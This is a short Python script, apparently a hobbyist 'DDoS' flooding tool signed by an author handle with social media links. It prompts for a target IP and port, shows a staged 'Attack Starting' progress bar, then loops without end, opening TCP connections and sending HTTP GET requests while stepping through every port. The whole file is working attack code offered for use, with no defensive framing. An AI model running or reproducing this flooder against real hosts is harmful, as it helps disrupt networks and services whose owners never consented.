import os
import time
import socket
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Clear screen based on the operating system
os.system("cls" if os.name == "nt" else "clear")

print("Author   : HA-MRX")
print("YouTube  : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
print("GitHub   : https://github.com/Ha3MrX")
print("Facebook : https://www.facebook.com/muhamad.jabar222")
print()

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("cls" if os.name == "nt" else "clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(2)

sent = 0
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Set timeout for the connection
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        sent += 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        sock.close()
    except socket.error as e:
        print(f"Error: {e}")
        time.sleep(1)  # Adding a delay to prevent spamming the error messages
    if port == 65534:
        port = 1
    else:
        port += 1
